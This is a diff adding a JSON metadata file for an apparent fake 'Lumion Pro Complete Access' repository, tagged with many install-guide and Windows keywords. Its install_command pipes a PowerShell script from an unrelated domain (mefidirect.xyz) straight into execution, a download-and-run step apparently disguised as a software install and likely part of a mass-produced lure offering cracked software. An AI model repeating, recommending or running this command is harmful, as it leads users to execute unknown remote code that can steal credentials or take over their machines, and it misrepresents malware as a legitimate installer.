@@ -1,0 +1,27 @@
+{
+  "repo": "lumion-pro-complete-access",
+  "product": "Lumion Pro Complete Access",
+  "kind": "cad",
+  "install_type": "download",
+  "download_url": "https://lumion.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "cad",
+  "topics": [
+    "lumion-build",
+    "lumion-latest-build",
+    "lumion-client",
+    "install-guide",
+    "windows-10",
+    "lumion-win64",
+    "desktop-app",
+    "productivity",
+    "lumion-install-steps",
+    "lumion-native-client",
+    "getting-started",
+    "drafting-tools",
+    "windows-11"
+  ]
+}
